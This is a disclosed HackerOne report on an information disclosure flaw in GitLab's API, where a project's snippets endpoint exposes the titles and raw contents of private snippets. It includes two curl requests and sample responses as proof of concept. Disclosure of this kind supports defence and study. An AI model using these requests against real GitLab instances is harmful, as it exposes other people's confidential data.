@@ -1,0 +1,58 @@
+ReportLink:https://hackerone.com/reports/134305
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/jobert
+ReportedTo:GitLab(gitlab)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:03.05.2016 0:57:56
+
+Summary:
+
+# Vulnerability details
+The `/projects/:id/snippets` resource leaks private snippets that were posted in a public or internal project.
+
+# Proof of concept
+As a victim, create a new public or internal project. Lets state that the project has ID 1. Enable the snippets feature in the project settings and create a private snippet for the project. As an attacker, fetch all the snippets for the project:
+
+```bash
+curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets"
+```
+
+The response will contain snippet titles that were marked as private:
+
+```json
+[
+  {
+    "id":6,
+    "title":"Secret snippet",
+    "file_name":"",
+    "author":{
+      "name":"Jane Doe",
+      "username":"jane",
+      "id":3,
+      "state":"active",
+      "avatar_url":"http://www.gravatar.com/avatar/f4d2ae4a63880c2a1c796bdd6d06a2d8?s=80\u0026d=identicon",
+      "web_url":"http://gitlab-ubuntu-2gb-sfo1-01/u/jane"
+    },
+    "updated_at":"2016-04-25T01:06:05.554Z",
+    "created_at":"2016-04-25T01:06:05.554Z",
+    "expires_at":null
+  }
+]
+```
+
+The contents of a private snippet can be read by sending the following request to the GitLab API:
+
+```bash
+curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets/6/raw"
+```
+
+The response of this request leaks the contents of the snippet:
+
+```
+These are the contents of a private snippet.
+```
+
+# Impact
+It seems that private snippets may be used to hold private (API) tokens or similar confidential information. This can seriously damage to a company depending on what kind of information is shared.
